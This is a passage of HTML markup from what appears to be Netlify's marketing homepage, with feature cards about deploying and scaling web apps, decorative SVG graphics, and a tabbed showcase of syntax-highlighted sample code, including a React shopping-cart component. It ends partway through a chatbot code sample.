                                                    <span data-astro-cid-u4qoyrkz="" style="">Experiment faster</span>
                                                </h2>
                                            </div>
                                            <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                                <div class="prose l-stack text-left l-stack-medium" data-sb-field-path=".items.1" _key="e18b6e19eadd" _type="markdownBlock" data-astro-cid-cnvtppup="" style="">
                                                    <p>Build any frontend app with your favorite stack and more flexible serverless infrastructure than anywhere else - from edge functions to background jobs.</p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div data-sb-field-path=".columns.1" class="column l-stack l-stack-medium" style="" data-astro-cid-fsqfrxl4="">
                                    <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                        <div class="card | l-flex-stack l-stack-small" data-options="" data-sb-field-path=".items.0" data-astro-cid-dohjnao5="">
                                            <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                                <h2 data-sb-field-path=".items.0" data-astro-cid-u4qoyrkz="true" class="heading l-stack l-stack-3xs font-heading text-2 font-bold text-left">
                                                    <span class="heading-eyebrow c-badge" data-mode="light" data-type="light" data-size="small" data-color="blue" data-astro-cid-u4qoyrkz="true">Deploy &amp;collaborate </span>
                                                    <span data-astro-cid-u4qoyrkz="" style="">Iterate together</span>
                                                </h2>
                                            </div>
                                            <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                                <div class="prose l-stack l-stack-medium" data-sb-field-path=".items.1" _key="b3cfbf570d9a" _type="markdownBlock" data-astro-cid-cnvtppup="" style="">
                                                    <p>Turn every Git push into a production-ready release. Get instant deploy previews and keep your team in sync without managing configs, variables, or staging servers.</p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div data-sb-field-path=".columns.2" class="column l-stack l-stack-medium" style="" data-astro-cid-fsqfrxl4="">
                                    <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                        <div class="card | l-flex-stack l-stack-small" data-options="repel-last-element" data-sb-field-path=".items.0" data-astro-cid-dohjnao5="">
                                            <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                                <h2 data-sb-field-path=".items.0" data-astro-cid-u4qoyrkz="true" class="heading l-stack l-stack-3xs font-heading text-2 font-bold text-left">
                                                    <span class="heading-eyebrow c-badge" data-mode="light" data-type="light" data-size="small" data-color="gold" data-astro-cid-u4qoyrkz="true">Run &amp;scale </span>
                                                    <span data-astro-cid-u4qoyrkz="" style="">Scale automatically</span>
                                                </h2>
                                            </div>
                                            <div class="ingredient" data-astro-cid-gfez5emt="" style="">
                                                <div class="prose l-stack l-stack-medium" data-sb-field-path=".items.1" _key="b94cbbd1a5cd" _type="markdownBlock" data-astro-cid-cnvtppup="" style="">
                                                    <p>Deliver sub-second experiences globally with granular cache and routing controls. Go from zero to enterprise-level traffic with built-in security.</p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="ingredient l-breakout ingredient-call-to-action-group" data-astro-cid-gfez5emt="" style="--stack-space: var(--space-2xl);">
                            <div class="cta-group | l-cluster" data-sb-field-path=".ingredients.1" data-cta-min-width="false" data-astro-cid-sc466a3x="" style="--cluster-justify: center;--cluster-gap: var(undefined);--cta-min-width: auto;">
                                <a class="button" data-type="primary" id="cta-explore-the-platform" href="/platform/" data-sb-field-path=".items.0" data-astro-cid-sc466a3x="true">Explore the platform</a>
                            </div>
                        </div>
                    </div>
                </section>
                <section class="pancake | l-section" data-sb-field-path="GZpQT76vrL14dXDLi338hK:pancakes.3" data-astro-cid-5mutinvq="" style="--breakout-area: content;">
                    <picture class="pancake-graphics" data-options="" data-astro-cid-5mutinvq="true" data-astro-cid-dxfgtee3="" style="--graphic-object-fit: cover;"></picture>
                    <div class="pancake-content | l-stack l-stack-medium" data-astro-cid-5mutinvq="" style="--breakout-area: content;">
                        <div class="ingredient l-breakout ingredient-import" data-astro-cid-gfez5emt="" style="">
                            <div class="dev-pancake-bg" data-astro-cid-hpyyxts7="">
                                <div class="dev-pancake-bg-shapes | l-center l-overlay-stack" data-astro-cid-hpyyxts7="">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="373" height="169" fill="none" viewBox="0 0 373 169" data-astro-cid-hpyyxts7="">
                                        <mask id="a" fill="#fff" data-astro-cid-hpyyxts7="">
                                            <path fill-rule="evenodd" d="M105 9H38v16h67V9Zm0 19H38v15h67V28ZM38 60V45h67v15H38Zm0 3v15h67V63H38Zm0 33V81h67v15H38Zm0 3v15h67V99H38Zm0 32v-15h67v15H38Zm0 3v17h67v-17H38Z" clip-rule="evenodd" data-astro-cid-hpyyxts7=""></path>
                                        </mask>
                                        <path class="pull-shape" style="--pull: -35%" fill="#14D8D4" d="M38 9V8h-1v1h1Zm67 0h1V8h-1v1ZM38 25h-1v1h1v-1Zm67 0v1h1v-1h-1Zm-67 3v-1h-1v1h1Zm67 0h1v-1h-1v1ZM38 43h-1v1h1v-1Zm67 0v1h1v-1h-1Zm-67 2v-1h-1v1h1Zm0 15h-1v1h1v-1Zm67-15h1v-1h-1v1Zm0 15v1h1v-1h-1ZM38 78h-1v1h1v-1Zm0-15v-1h-1v1h1Zm67 15v1h1v-1h-1Zm0-15h1v-1h-1v1ZM38 81v-1h-1v1h1Zm0 15h-1v1h1v-1Zm67-15h1v-1h-1v1Zm0 15v1h1v-1h-1Zm-67 18h-1v1h1v-1Zm0-15v-1h-1v1h1Zm67 15v1h1v-1h-1Zm0-15h1v-1h-1v1Zm-67 17v-1h-1v1h1Zm0 15h-1v1h1v-1Zm67-15h1v-1h-1v1Zm0 15v1h1v-1h-1Zm-67 3v-1h-1v1h1Zm0 17h-1v1h1v-1Zm67 0v1h1v-1h-1Zm0-17h1v-1h-1v1ZM38 10h67V8H38v2Zm1 15V9h-2v16h2Zm66-1H38v2h67v-2Zm-1-15v16h2V9h-2ZM38 29h67v-2H38v2Zm1 14V28h-2v15h2Zm66-1H38v2h67v-2Zm-1-14v15h2V28h-2ZM37 45v15h2V45h-2Zm68-1H38v2h67v-2Zm1 16V45h-2v15h2Zm-68 1h67v-2H38v2Zm1 17V63h-2v15h2Zm66-1H38v2h67v-2Zm-1-14v15h2V63h-2Zm-66 1h67v-2H38v2Zm-1 17v15h2V81h-2Zm68-1H38v2h67v-2Zm1 16V81h-2v15h2Zm-68 1h67v-2H38v2Zm1 17V99h-2v15h2Zm66-1H38v2h67v-2Zm-1-14v15h2V99h-2Zm-66 1h67v-2H38v2Zm-1 16v15h2v-15h-2Zm68-1H38v2h67v-2Zm1 16v-15h-2v15h2Zm-68 1h67v-2H38v2Zm-1 2v17h2v-17h-2Zm1 18h67v-2H38v2Zm68-1v-17h-2v17h2Zm-1-18H38v2h67v-2Z" mask="url(#a)" data-astro-cid-hpyyxts7=""></path>
                                        <path stroke="#14D8D4" d="M338 157c6 6 16 6 22 0 7-6 7-16 1-22l-70-70c-6-6-16-6-22 0s-7 16 0 23l69 69Z" data-astro-cid-hpyyxts7=""></path>
                                        <circle cx="177.6" cy="123.1" r="5" stroke="#14D8D4" data-astro-cid-hpyyxts7=""></circle>
                                        <path fill="#14D8D4" fill-rule="evenodd" d="M6 85a4 4 0 0 0 0 9v1a5 5 0 0 1 0-11v1Zm5 4Z" clip-rule="evenodd" data-astro-cid-hpyyxts7=""></path>
                                        <g class="pull-shape" style="--pull: -35%" data-astro-cid-hpyyxts7="">
                                            <path stroke="#14D8D4" d="m224 47-46 46-46-46 46-45z" data-astro-cid-hpyyxts7=""></path>
                                            <path stroke="#14D8D4" d="m206 47-28 28-27-28 27-27z" data-astro-cid-hpyyxts7=""></path>
                                        </g>
                                    </svg>
                                    <svg width="283" height="401" viewBox="0 0 283 401" fill="none" xmlns="http://www.w3.org/2000/svg" data-astro-cid-hpyyxts7="">
                                        <g class="pull-shape" style="--pull: -25%" data-astro-cid-hpyyxts7="">
                                            <path d="M112.464 231.008L192.458 231.008C192.193 253.151 174.382 271.008 152.461 271.008C130.54 271.008 112.728 253.151 112.464 231.008Z" stroke="#14D8D4" data-astro-cid-hpyyxts7=""></path>
                                        </g>
                                        <mask id="path-2-inside-1_307_351" fill="white" data-astro-cid-hpyyxts7="">
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M192.961 328.508H72.9609L72.9609 400.508H92.9609C92.9609 378.417 110.87 360.508 132.961 360.508C155.052 360.508 172.961 378.417 172.961 400.508H192.961V328.508Z" data-astro-cid-hpyyxts7=""></path>
                                        </mask>
                                        <path class="pull-shape" style="--pull: -5%" d="M72.9609 328.508V327.508H71.9609V328.508H72.9609ZM192.961 328.508H193.961V327.508H192.961V328.508ZM72.9609 400.508H71.9609V401.508H72.9609V400.508ZM92.9609 400.508L92.9609 401.508H93.9609L93.9609 400.508H92.9609ZM172.961 400.508H171.961V401.508H172.961V400.508ZM192.961 400.508V401.508H193.961V400.508H192.961ZM72.9609 329.508H192.961V327.508H72.9609V329.508ZM73.9609 400.508L73.9609 328.508H71.9609L71.9609 400.508H73.9609ZM92.9609 399.508H72.9609V401.508H92.9609L92.9609 399.508ZM132.961 359.508C110.317 359.508 91.9609 377.864 91.9609 400.508H93.9609C93.9609 378.969 111.422 361.508 132.961 361.508V359.508ZM173.961 400.508C173.961 377.864 155.605 359.508 132.961 359.508V361.508C154.5 361.508 171.961 378.969 171.961 400.508H173.961ZM192.961 399.508H172.961V401.508H192.961V399.508ZM191.961 328.508V400.508H193.961V328.508H191.961Z" fill="#14D8D4" mask="url(#path-2-inside-1_307_351)" data-astro-cid-hpyyxts7=""></path>
                                        <circle cx="193.961" cy="287.508" r="4.5" stroke="#14D8D4" data-astro-cid-hpyyxts7=""></circle>
                                        <path class="pull-shape" style="--pull: -15%" fill-rule="evenodd" clip-rule="evenodd" d="M228.961 191.508C228.961 191.508 228.961 191.508 228.961 191.508C228.961 189.299 227.17 187.508 224.961 187.508C222.752 187.508 220.961 189.299 220.961 191.508C220.961 191.508 220.961 191.508 220.961 191.508H219.961C219.961 191.508 219.961 191.508 219.961 191.508C219.961 188.747 222.2 186.508 224.961 186.508C227.722 186.508 229.961 188.747 229.961 191.508C229.961 191.508 229.961 191.508 229.961 191.508H228.961Z" fill="#14D8D4" data-astro-cid-hpyyxts7=""></path>
                                        <path class="pull-shape" style="--pull: -45%" fill-rule="evenodd" clip-rule="evenodd" d="M80.461 275.008C80.461 275.008 80.4609 275.008 80.4609 275.008C78.2518 275.008 76.4609 276.799 76.4609 279.008C76.4609 281.217 78.2518 283.008 80.4609 283.008C80.4609 283.008 80.461 283.008 80.461 283.008L80.461 284.008C80.461 284.008 80.4609 284.008 80.4609 284.008C77.6995 284.008 75.4609 281.77 75.4609 279.008C75.4609 276.247 77.6995 274.008 80.4609 274.008C80.4609 274.008 80.461 274.008 80.461 274.008L80.461 275.008Z" fill="#14D8D4" data-astro-cid-hpyyxts7=""></path>
                                        <path d="M82.254 103.741C88.3582 109.845 98.3226 109.792 104.51 103.605C110.698 97.4171 110.751 87.4527 104.647 81.3485L35.0744 11.7762C28.9702 5.67197 19.0058 5.72517 12.8183 11.9127C6.63073 18.1002 6.57753 28.0646 12.6817 34.1688L82.254 103.741Z" stroke="#14D8D4" data-astro-cid-hpyyxts7=""></path>
                                        <g class="pull-shape" style="--pull: -35%" data-astro-cid-hpyyxts7="">
                                            <rect x="199.449" y="177.997" width="64.977" height="64.977" transform="rotate(-180 199.449 177.997)" stroke="#14D8D4" data-astro-cid-hpyyxts7=""></rect>
                                            <rect x="186.253" y="164.801" width="38.5862" height="38.5862" transform="rotate(-180 186.253 164.801)" stroke="#14D8D4" data-astro-cid-hpyyxts7=""></rect>
                                        </g>
                                        <mask id="path-10-inside-2_307_351" fill="white" data-astro-cid-hpyyxts7="">
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M282.56 257.531H215.924V273.926H282.56V257.531ZM282.56 276.625H215.924V291.67H282.56V276.625ZM215.924 309.414V294.369H282.56V309.414H215.924ZM215.924 312.113V327.159H282.56V312.113H215.924ZM215.924 344.903V329.857H282.56V344.903H215.924ZM215.924 347.602V362.647H282.56V347.602H215.924ZM215.924 380.391L215.924 365.346H282.56V380.391H215.924ZM215.924 383.09V399.485H282.56V383.09H215.924Z" data-astro-cid-hpyyxts7=""></path>
                                        </mask>
                                        <path class="pull-shape" style="--pull: -15%" d="M215.924 257.531V256.531H214.924V257.531H215.924ZM282.56 257.531H283.56V256.531H282.56V257.531ZM215.924 273.926H214.924V274.926H215.924V273.926ZM282.56 273.926V274.926H283.56V273.926H282.56ZM215.924 276.625V275.625H214.924V276.625H215.924ZM282.56 276.625H283.56V275.625H282.56V276.625ZM215.924 291.67H214.924V292.67H215.924V291.67ZM282.56 291.67V292.67H283.56V291.67H282.56ZM215.924 294.369V293.369H214.924V294.369H215.924ZM215.924 309.414H214.924V310.414H215.924V309.414ZM282.56 294.369H283.56V293.369H282.56V294.369ZM282.56 309.414V310.414H283.56V309.414H282.56ZM215.924 327.159H214.924V328.159H215.924V327.159ZM215.924 312.113V311.113H214.924V312.113H215.924ZM282.56 327.159V328.159H283.56V327.159H282.56ZM282.56 312.113H283.56V311.113H282.56V312.113ZM215.924 329.857V328.857H214.924V329.857H215.924ZM215.924 344.903H214.924V345.903H215.924V344.903ZM282.56 329.857H283.56V328.857H282.56V329.857ZM282.56 344.903V345.903H283.56V344.903H282.56ZM215.924 362.647H214.924V363.647H215.924V362.647ZM215.924 347.602V346.602H214.924V347.602H215.924ZM282.56 362.647V363.647H283.56V362.647H282.56ZM282.56 347.602H283.56V346.602H282.56V347.602ZM215.924 365.346V364.346H214.924V365.346H215.924ZM215.924 380.391H214.924V381.391H215.924V380.391ZM282.56 365.346H283.56V364.346H282.56V365.346ZM282.56 380.391V381.391H283.56V380.391H282.56ZM215.924 383.09V382.09H214.924V383.09H215.924ZM215.924 399.485H214.924V400.485H215.924V399.485ZM282.56 399.485V400.485H283.56V399.485H282.56ZM282.56 383.09H283.56V382.09H282.56V383.09ZM215.924 258.531H282.56V256.531H215.924V258.531ZM216.924 273.926V257.531H214.924V273.926H216.924ZM282.56 272.926H215.924V274.926H282.56V272.926ZM281.56 257.531V273.926H283.56V257.531H281.56ZM215.924 277.625H282.56V275.625H215.924V277.625ZM216.924 291.67V276.625H214.924V291.67H216.924ZM282.56 290.67H215.924V292.67H282.56V290.67ZM281.56 276.625V291.67H283.56V276.625H281.56ZM214.924 294.369V309.414H216.924V294.369H214.924ZM282.56 293.369H215.924V295.369H282.56V293.369ZM283.56 309.414V294.369H281.56V309.414H283.56ZM215.924 310.414H282.56V308.414H215.924V310.414ZM216.924 327.159V312.113H214.924V327.159H216.924ZM282.56 326.159H215.924V328.159H282.56V326.159ZM281.56 312.113V327.159H283.56V312.113H281.56ZM215.924 313.113H282.56V311.113H215.924V313.113ZM214.924 329.857V344.903H216.924V329.857H214.924ZM282.56 328.857H215.924V330.857H282.56V328.857ZM283.56 344.903V329.857H281.56V344.903H283.56ZM215.924 345.903H282.56V343.903H215.924V345.903ZM216.924 362.647V347.602H214.924V362.647H216.924ZM282.56 361.647H215.924V363.647H282.56V361.647ZM281.56 347.602V362.647H283.56V347.602H281.56ZM215.924 348.602H282.56V346.602H215.924V348.602ZM214.924 365.346L214.924 380.391H216.924L216.924 365.346H214.924ZM282.56 364.346H215.924V366.346H282.56V364.346ZM283.56 380.391V365.346H281.56V380.391H283.56ZM215.924 381.391H282.56V379.391H215.924V381.391ZM214.924 383.09V399.485H216.924V383.09H214.924ZM215.924 400.485H282.56V398.485H215.924V400.485ZM283.56 399.485V383.09H281.56V399.485H283.56ZM282.56 382.09H215.924V384.09H282.56V382.09Z" fill="#14D8D4" mask="url(#path-10-inside-2_307_351)" data-astro-cid-hpyyxts7=""></path>
                                    </svg>
                                </div>
                            </div>
                            <div id="dev-pancake" class="dev-pancake-wrapper | l-center" data-theme="dark" data-sb-object-id="src/data/dev-pancake.json" data-astro-cid-bthvj2cz="">
                                <article class="dev-pancake-window" data-astro-cid-bthvj2cz="">
                                    <section class="dev-pancake-content | l-flex-stack" data-astro-cid-bthvj2cz="">
                                        <h2 class="text-3" data-astro-cid-bthvj2cz="">
                                            <span data-sb-field-path=".headingStart" data-astro-cid-bthvj2cz="">Ship your</span>
                                            <span class="dev-pancake-dynamic-text" data-astro-cid-bthvj2cz="">landing page</span>
                                            <span data-sb-field-path=".headingEnd" data-astro-cid-bthvj2cz="">in just a few clicks</span>
                                        </h2>
                                        <p class="text-1 text-pretty" data-sb-field-path=".supporting" data-astro-cid-bthvj2cz="">Create a new project or connect an existing one to explore features like rollbacks, CI/CD, edge functions, collaborative deploy previews, and more. </p>
                                        <div class="l-cluster" data-astro-cid-bthvj2cz="">
                                            <a id="cta-dev-pancake-read-docs" class="button" data-type="default" href="https://docs.netlify.com/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" data-sb-field-path=".ctas.0" data-astro-cid-bthvj2cz="">Read the docs </a>
                                            <a id="cta-dev-pancake-dev-hub" class="button" data-type="default" href="https://developers.netlify.com/?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" data-sb-field-path=".ctas.1" data-astro-cid-bthvj2cz="">Developer Hub </a>
                                        </div>
                                    </section>
                                    <section class="dev-pancake-code" data-astro-cid-bthvj2cz="">
                                        <the-tabs class="dev-pancake-tabs" data-astro-cid-bthvj2cz="true">
                                            <div role="tablist" data-astro-cid-bthvj2cz="">
                                                <button id="cta-dev-code-tabs-e-commerce-site" role="tab" data-type="reset" aria-selected="true" data-astro-cid-bthvj2cz="" aria-controls="mfnw1s84-panel-0" tabindex="0">
                                                    <svg width="1.13em" height="1em" class="icon" data-astro-cid-bthvj2cz="true" data-icon="store">
                                                        <symbol id="ai:local:store" viewBox="0 0 576 512">
                                                            <path fill="currentcolor" d="m547.6 103.8-57.3-90.7C485.2 5 476.1 0 466.4 0H109.6c-9.7 0-18.8 5-23.9 13.1l-57.4 90.7c-29.6 46.8-3.4 111.9 51.9 119.4 4 .5 8.1.8 12.1.8 26.1 0 49.3-11.4 65.2-29 15.9 17.6 39.1 29 65.2 29s49.3-11.4 65.2-29c15.9 17.6 39.1 29 65.2 29 26.2 0 49.3-11.4 65.2-29 16 17.6 39.1 29 65.2 29 4.1 0 8.1-.3 12.1-.8 55.5-7.4 81.8-72.5 52.1-119.4zm-47.9 151.1h-.1c-5.3.7-10.7 1.1-16.2 1.1-12.4 0-24.3-1.9-35.4-5.3V384H128V250.6c-11.2 3.5-23.2 5.4-35.6 5.4-5.5 0-11-.4-16.3-1.1H76c-4.1-.6-8.1-1.3-12-2.3V448c0 35.3 28.7 64 64 64h320c35.3 0 64-28.7 64-64V252.6c-4 1-8 1.8-12.3 2.3"></path>
                                                        </symbol>
                                                        <use href="#ai:local:store"></use>
                                                    </svg>
                                                    <h3 data-sb-field-path="templates.0.title" class="tab-title | heading text-0 font-semibold" data-astro-cid-bthvj2cz="">e-commerce site </h3>
                                                </button>
                                                <button id="cta-dev-code-tabs-ai-chatbot" role="tab" data-type="reset" aria-selected="false" data-astro-cid-bthvj2cz="" aria-controls="mfnw1s84-panel-1" tabindex="-1">
                                                    <svg width="1em" height="1em" class="icon" data-astro-cid-bthvj2cz="true" data-icon="sparkles">
                                                        <symbol id="ai:local:sparkles" viewBox="0 0 512 512">
                                                            <path fill="currentcolor" d="M327.5 85.2c-4.5 1.7-7.5 6-7.5 10.8s3 9.1 7.5 10.8L384 128l21.2 56.5c1.7 4.5 6 7.5 10.8 7.5s9.1-3 10.8-7.5L448 128l56.5-21.2c4.5-1.7 7.5-6 7.5-10.8s-3-9.1-7.5-10.8L448 64 426.8 7.5C425.1 3 420.8 0 416 0s-9.1 3-10.8 7.5L384 64zM9.3 240c-5.7 2.6-9.3 8.3-9.3 14.6s3.6 11.9 9.3 14.5l17 7.9 8.1 3.7.6.3 88.3 40.8 40.8 88.2.3.6 3.7 8.1 7.9 17.1c2.6 5.7 8.3 9.3 14.5 9.3s11.9-3.6 14.5-9.3l7.9-17.1 3.7-8.1.3-.6 40.8-88.3L346 281l.6-.3 8.1-3.7 17.1-7.9c5.7-2.6 9.3-8.3 9.3-14.5s-3.6-11.9-9.3-14.5l-17.1-7.9-8.1-3.7-.6-.3-88.3-40.8L217 99.1l-.3-.6-3.7-8.2-7.9-17.1c-2.6-5.7-8.3-9.3-14.5-9.3s-11.9 3.6-14.5 9.3l-7.9 17.1-3.7 8.1-.3.6-40.8 88.3-88.3 40.8-.6.3-8.1 3.7zm83 14.5 51.2-23.6c10.4-4.8 18.7-13.1 23.5-23.5l23.6-51.2 23.6 51.2c4.8 10.4 13.1 18.7 23.5 23.5l51.2 23.6-51.2 23.6c-10.4 4.8-18.7 13.1-23.5 23.5l-23.6 51.2-23.6-51.2c-4.8-10.4-13.1-18.7-23.5-23.5l-51.2-23.5zM384 384l-56.5 21.2c-4.5 1.7-7.5 6-7.5 10.8s3 9.1 7.5 10.8L384 448l21.2 56.5c1.7 4.5 6 7.5 10.8 7.5s9.1-3 10.8-7.5L448 448l56.5-21.2c4.5-1.7 7.5-6 7.5-10.8s-3-9.1-7.5-10.8L448 384l-21.2-56.5c-1.7-4.5-6-7.5-10.8-7.5s-9.1 3-10.8 7.5z"></path>
                                                        </symbol>
                                                        <use href="#ai:local:sparkles"></use>
                                                    </svg>
                                                    <h3 data-sb-field-path="templates.1.title" class="tab-title | heading text-0 font-semibold" data-astro-cid-bthvj2cz="">AI chatbot </h3>
                                                </button>
                                                <button id="cta-dev-code-tabs-landing-page" role="tab" data-type="reset" aria-selected="false" data-astro-cid-bthvj2cz="" aria-controls="mfnw1s84-panel-2" tabindex="-1">
                                                    <svg width="1em" height="1em" class="icon is-active" data-astro-cid-bthvj2cz="true" data-icon="browser">
                                                        <symbol id="ai:local:browser" viewBox="0 0 512 512">
                                                            <path fill="currentcolor" d="M.3 89.5C.1 91.6 0 93.8 0 96v320c0 35.3 28.7 64 64 64h384c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64H64c-2.2 0-4.4.1-6.5.3-9.2.9-17.8 3.8-25.5 8.2-10.2 6-18.6 14.6-24.3 25-3.9 7.3-6.5 15.4-7.4 24M48 160h416v256c0 8.8-7.2 16-16 16H64c-8.8 0-16-7.2-16-16z"></path>
                                                        </symbol>
                                                        <use href="#ai:local:browser"></use>
                                                    </svg>
                                                    <h3 data-sb-field-path="templates.2.title" class="tab-title | heading text-0 font-semibold" data-astro-cid-bthvj2cz="">landing page </h3>
                                                </button>
                                                <button id="cta-dev-code-tabs-edge-function" role="tab" data-type="reset" aria-selected="false" data-astro-cid-bthvj2cz="" aria-controls="mfnw1s84-panel-3" tabindex="-1">
                                                    <svg width="0.88em" height="1em" class="icon" data-astro-cid-bthvj2cz="true" data-icon="lambda">
                                                        <symbol id="ai:local:lambda" viewBox="0 0 448 512">
                                                            <path fill="currentcolor" d="M32 32C14.3 32 0 46.3 0 64s14.3 32 32 32h108.2l16.4 32.7L18.8 434.9c-7.3 16.1-.1 35.1 16 42.3s35.1.1 42.3-16l116.4-258.6 121 242c10.8 21.7 33 35.4 57.2 35.4H416c17.7 0 32-14.3 32-32s-14.3-32-32-32h-44.2L197.5 67.4c-10.9-21.7-33-35.4-57.3-35.4z"></path>
                                                        </symbol>
                                                        <use href="#ai:local:lambda"></use>
                                                    </svg>
                                                    <h3 data-sb-field-path="templates.3.title" class="tab-title | heading text-0 font-semibold" data-astro-cid-bthvj2cz="">edge function </h3>
                                                </button>
                                            </div>
                                            <div class="dev-pancake-tabs-panel-wrapper text--1" data-astro-cid-bthvj2cz="">
                                                <div data-sb-field-path="templates.0.code" role="tabpanel" data-astro-cid-bthvj2cz="" id="mfnw1s84-panel-0" aria-labelledby="cta-dev-code-tabs-e-commerce-site">
                                                    <div data-astro-cid-bthvj2cz="true" class="astro-jgrc2lfe">
                                                        <pre class="astro-code dracula-soft" style="background-color:#282A36;color:#f6f6f4; overflow-x: auto;" tabindex="0" data-language="js">                                                            <code>
                                                                <span class="line">
                                                                    <span style="color:#F286C4">export</span>
                                                                    <span style="color:#F286C4">function</span>
                                                                    <span style="color:#62E884">CartMain</span>
                                                                    <span style="color:#F6F6F4">({</span>
                                                                    <span style="color:#FFB86C;font-style:italic">layout</span>
                                                                    <span style="color:#F6F6F4">, </span>
                                                                    <span style="color:#FFB86C;font-style:italic">cart</span>
                                                                    <span style="color:#F6F6F4">}</span>
                                                                    <span style="color:#F286C4">:</span>
                                                                    <span style="color:#97E1F1;font-style:italic">CartMainProps</span>
                                                                    <span style="color:#F6F6F4">) {</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F286C4">const</span>
                                                                    <span style="color:#F6F6F4">linesCount </span>
                                                                    <span style="color:#F286C4">=</span>
                                                                    <span style="color:#62E884">Boolean</span>
                                                                    <span style="color:#F6F6F4">(cart?.lines?.nodes?.length </span>
                                                                    <span style="color:#F286C4">||</span>
                                                                    <span style="color:#BF9EEE">0</span>
                                                                    <span style="color:#F6F6F4">);</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F286C4">const</span>
                                                                    <span style="color:#F6F6F4">withDiscount </span>
                                                                    <span style="color:#F286C4">=</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">cart </span>
                                                                    <span style="color:#F286C4">&amp;&amp;</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#62E884">Boolean</span>
                                                                    <span style="color:#F6F6F4">(cart.discountCodes.</span>
                                                                    <span style="color:#62E884">filter</span>
                                                                    <span style="color:#F6F6F4">((</span>
                                                                    <span style="color:#FFB86C;font-style:italic">code</span>
                                                                    <span style="color:#F6F6F4">) </span>
                                                                    <span style="color:#F286C4">=&gt;</span>
                                                                    <span style="color:#F6F6F4">code.applicable).length);</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F286C4">const</span>
                                                                    <span style="color:#F6F6F4">className </span>
                                                                    <span style="color:#F286C4">=</span>
                                                                    <span style="color:#E7EE98">`cart-main </span>
                                                                    <span style="color:#F286C4">${</span>
                                                                    <span style="color:#F6F6F4">withDiscount</span>
                                                                    <span style="color:#F286C4">?</span>
                                                                    <span style="color:#DEE492">'</span>
                                                                    <span style="color:#E7EE98">with-discount</span>
                                                                    <span style="color:#DEE492">'</span>
                                                                    <span style="color:#F286C4">:</span>
                                                                    <span style="color:#DEE492">''</span>
                                                                    <span style="color:#F286C4">}</span>
                                                                    <span style="color:#E7EE98">`</span>
                                                                    <span style="color:#F6F6F4">;</span>
                                                                </span>
                                                                <span class="line"></span>
                                                                <span class="line">
                                                                    <span style="color:#F286C4">return</span>
                                                                    <span style="color:#F6F6F4">(</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">&lt;</span>
                                                                    <span style="color:#F286C4">div</span>
                                                                    <span style="color:#62E884;font-style:italic">className</span>
                                                                    <span style="color:#F286C4">={</span>
                                                                    <span style="color:#F6F6F4">className</span>
                                                                    <span style="color:#F286C4">}</span>
                                                                    <span style="color:#F6F6F4">&gt;</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">&lt;</span>
                                                                    <span style="color:#97E1F1;font-style:italic">CartEmpty</span>
                                                                    <span style="color:#62E884;font-style:italic">hidden</span>
                                                                    <span style="color:#F286C4">={</span>
                                                                    <span style="color:#F6F6F4">linesCount</span>
                                                                    <span style="color:#F286C4">}</span>
                                                                    <span style="color:#62E884;font-style:italic">layout</span>
                                                                    <span style="color:#F286C4">={</span>
                                                                    <span style="color:#F6F6F4">layout</span>
                                                                    <span style="color:#F286C4">}</span>
                                                                    <span style="color:#F6F6F4">/&gt;</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">&lt;</span>
                                                                    <span style="color:#97E1F1;font-style:italic">CartDetails</span>
                                                                    <span style="color:#62E884;font-style:italic">cart</span>
                                                                    <span style="color:#F286C4">={</span>
                                                                    <span style="color:#F6F6F4">cart</span>
                                                                    <span style="color:#F286C4">}</span>
                                                                    <span style="color:#62E884;font-style:italic">layout</span>
                                                                    <span style="color:#F286C4">={</span>
                                                                    <span style="color:#F6F6F4">layout</span>
                                                                    <span style="color:#F286C4">}</span>
                                                                    <span style="color:#F6F6F4">/&gt;</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">&lt;/</span>
                                                                    <span style="color:#F286C4">div</span>
                                                                    <span style="color:#F6F6F4">&gt;</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">);</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">}</span>
                                                                </span>
                                                            </code>
                                                        </pre>
                                                    </div>
                                                </div>
                                                <div data-sb-field-path="templates.1.code" role="tabpanel" hidden="" data-astro-cid-bthvj2cz="" id="mfnw1s84-panel-1" aria-labelledby="cta-dev-code-tabs-ai-chatbot">
                                                    <div data-astro-cid-bthvj2cz="true" class="astro-jgrc2lfe">
                                                        <pre class="astro-code dracula-soft" style="background-color:#282A36;color:#f6f6f4; overflow-x: auto;" tabindex="0" data-language="js">                                                            <code>
                                                                <span class="line">
                                                                    <span style="color:#F286C4">const</span>
                                                                    <span style="color:#F6F6F4">stream </span>
                                                                    <span style="color:#F286C4">=</span>
                                                                    <span style="color:#F286C4">await</span>
                                                                    <span style="color:#62E884">getChatStream</span>
                                                                    <span style="color:#F6F6F4">(</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F6F6F4">{</span>
                                                                </span>
                                                                <span class="line">
                                                                    <span style="color:#F286C4">...</span>
